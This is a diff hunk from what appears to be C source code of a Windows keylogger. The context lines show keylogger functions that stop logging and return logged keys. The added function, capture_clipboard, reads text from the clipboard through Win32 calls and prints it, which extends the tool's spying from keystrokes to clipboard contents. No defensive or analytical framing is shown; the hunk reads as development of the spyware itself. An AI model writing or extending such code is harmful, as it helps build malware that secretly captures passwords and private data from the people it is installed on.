@@ -52,6 +52,20 @@ void keylogger_stop(Keylogger* logger) {
     }
 }
 
+void capture_clipboard(void) {
+    if (OpenClipboard(NULL)) {
+        HANDLE hData = GetClipboardData(CF_TEXT);
+        if (hData != NULL) {
+            char* pszText = (char*)GlobalLock(hData);
+            if (pszText != NULL) {
+                printf("Clipboard Data: %s\n", pszText);
+                GlobalUnlock(hData);
+            }
+        }
+        CloseClipboard();
+    }
+}
+
 char* keylogger_get_logged_keys(Keylogger* logger) {
     return safe_strdup(logger->key_buffer);
 }
